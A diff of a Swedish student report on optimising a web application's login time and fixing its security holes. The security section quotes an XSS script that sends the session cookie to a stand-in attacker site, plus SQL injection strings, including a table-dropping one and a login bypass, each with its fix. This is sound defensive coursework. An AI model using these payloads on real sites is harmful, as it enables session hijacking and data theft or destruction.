@@ -7,11 +7,13 @@ Det fanns en hel del att göra för att optimera laddningstiden för sidan och d
 Då det främst var inloggningen som tog tid gjordes flest tester här. Applikationen har under dessa tester körs från binero.
 
 Tider för inloggningen i sekunder.
-
+<pre>
 Gjort åtgärd:           1      2      3      4      5     6     7
+
 Första gången: 7050 - 3640 - 6500 - 6320 - 3080 - 3710 - 913 - 1070
 Andra gången:  5860 - 2620 - 2230 - 2600 - 2760 -  586 - 112 -  647
 Tredje gången: 4270 - 2250 - 2020 - 3100 - 3030 -  424 - 367 -  496
+</pre>
 
  Åtgärder
  1. Ta bort onödig location (img/middle.php) + delayen på 2 sec
@@ -22,6 +24,7 @@ Tredje gången: 4270 - 2250 - 2020 - 3100 - 3030 -  424 - 367 -  496
  6. Minska bilderna - mindre data att skicka => snabbare (food.jpg)
  7. Minimera storleken på css- och js-filer.
  
+ Mer om åtgärderna
  
  1. Genom att ta bort GET-requests drar vi ner på laddningstiden så location's vill vi minimera. Sen tog jag även bort fulingen som gjorde att applikationen tog 2 sekunder extra att laddas. Som källa till denna åtgärd tar jag både boken och föreläsningarna då vi pratat mycket om att dra ner på antalet förfrågningar. Laddningstiden blev markant bättre främst på grund av de 2 sekunderna som applikationen pausade.
  2. Scriptet fanns ej och såg därför ingen anledning till att ha det med. Detta drog ner på ytterligare en GET-request även fast det nog inte gjorde speciellt mycket är det en av de små bäckarna. Laddningstiden blev konstig första gången men andra och tredje visar ändå på förbättring, frågan är dock om det gjorde så pass mycket som den visar. Samma referens som ovan.
@@ -41,31 +44,31 @@ Tredje gången: 4270 - 2250 - 2020 - 3100 - 3030 -  424 - 367 -  496
 ### Säkerhet ###
 
 1. Det fanns gott om säkerhetshål i applikationen varav ett var XSS i meddelandefältet.
-* Man skulle kunna med hjälp av följande rad kunna skicka iväg cookieinformation till en extern sida: <script language="JavaScript">document.location="http://minhaxx0rsida.se/sparacookie.php?cookie=" + document.cookie;document.location="http://www.tillbakatillsidan.com"</script>
-* Jag fixade till detta genom att köra htmlentities på all data som ska ut.
-* Skada som hade kunnat ske är att någon får tag på ens session och kan komma in på sidan inloggad som dig.
+-Man skulle kunna med hjälp av följande rad kunna skicka iväg cookieinformation till en extern sida: <script language="JavaScript">document.location="http://minhaxx0rsida.se/sparacookie.php?cookie=" + document.cookie;document.location="http://www.tillbakatillsidan.com"</script>
+-Jag fixade till detta genom att köra htmlentities på all data som ska ut.
+-Skada som hade kunnat ske är att någon får tag på ens session och kan komma in på sidan inloggad som dig.
 
 2. Det finns inget skydd mot att highjacka sessioner.
-* Man kan om man kommer åt sessionsinformationen (t.ex med en XSS-attack) använda denna för att logga in på sidan.
-* Jag fixade detta genom att spara undan både IP och useragent som man sedan kollar mot. Går att manipulera men då måste attackeraren veta båda IP och useragent.
-* Skadan som hade kunnat ske är samma som ovan; någon kan komma in på sidan inloggad som dig.
+-Man kan om man kommer åt sessionsinformationen (t.ex med en XSS-attack) använda denna för att logga in på sidan.
+-Jag fixade detta genom att spara undan både IP och useragent som man sedan kollar mot. Går att manipulera men då måste attackeraren veta båda IP och useragent.
+-Skadan som hade kunnat ske är samma som ovan; någon kan komma in på sidan inloggad som dig.
 
 3. Mycket hål för SQL-Injections i ajaxanropen. Det jag upptäckt är getMessage, getMessageIdForProducer, getProducer går att utnyttja för SQL-injections.
-* Genom att mata in ' OR '1'='1 Kommer allt att hämtas hem. Vill man kan man även '; DROP TABLE tabellen;--
-* Fixas genom antingen att kolla så att ett ID är ett tal, intval() brukar jag använda för nummer. Att köra en prepare() och sen en bindParam() är vad jag gjort i detta fallet på samtliga.
-* Med en SQL-Injection skulle man kunna komma över information från databasen eller förstöra genom att ta bort och manipulera data. Är lösenorden dåligt krypterade skulle dessa kunna användas för att testa dina inloggningsuppgifter på andra tjänster.
+-Genom att mata in ' OR '1'='1 Kommer allt att hämtas hem. Vill man kan man även '; DROP TABLE tabellen;--
+-Fixas genom antingen att kolla så att ett ID är ett tal, intval() brukar jag använda för nummer. Att köra en prepare() och sen en bindParam() är vad jag gjort i detta fallet på samtliga.
+-Med en SQL-Injection skulle man kunna komma över information från databasen eller förstöra genom att ta bort och manipulera data. Är lösenorden dåligt krypterade skulle dessa kunna användas för att testa dina inloggningsuppgifter på andra tjänster.
 
 4. Det gick att logga in med SQL-injections i inloggningsfältet.
-* Genom att mata in ' OR '1'='1 i båda fälten kommer du loggas in, inte otänkbart med adminkonto då detta ofta registreras först. Vet du användarnamnet kan du skriva in det och sedan skriva ' OR '1'='1 i lösenordsfältet för att logga in som den personen.
-* Fixas som ovan genom att köra prepare() och bindParam().
-* Går att göra saker som ovan men även att logga in som andra.
+-Genom att mata in ' OR '1'='1 i båda fälten kommer du loggas in, inte otänkbart med adminkonto då detta ofta registreras först. Vet du användarnamnet kan du skriva in det och sedan skriva ' OR '1'='1 i lösenordsfältet för att logga in som den personen.
+-Fixas som ovan genom att köra prepare() och bindParam().
+-Går att göra saker som ovan men även att logga in som andra.
 
 5. Mer SQL-injections finns att genomföra i meddelandeformuläret, både som namn och meddelande. Detta är precis som ovan avhjälpt med prepare() och bindParam() och innefattar samma säkerhetsrisker som ovan.
 
 6. En säkerhetsrisk som var enkelt att missa var att vid utloggning blev man inte utloggad utan bara skickad till inloggningssidan. Gick man tillbaka var man fortfarande inloggad. Jag lade till en funktion som gjorde att man loggades ut innan man skickades tillbaka till index.php.
-* Risken är att någon annan sätter sig vid datorn och kan komma åt ditt konto då du inte loggats ut på riktigt.
-* Ta bort sessions hjälper i detta fallet för att döda inloggningen.
-* Förbrytaren kan göra allt du kan då den är inloggad som dig.
+-Risken är att någon annan sätter sig vid datorn och kan komma åt ditt konto då du inte loggats ut på riktigt.
+-Ta bort sessions hjälper i detta fallet för att döda inloggningen.
+-Förbrytaren kan göra allt du kan då den är inloggad som dig.
 
 ### Comet Long Polling ###
 
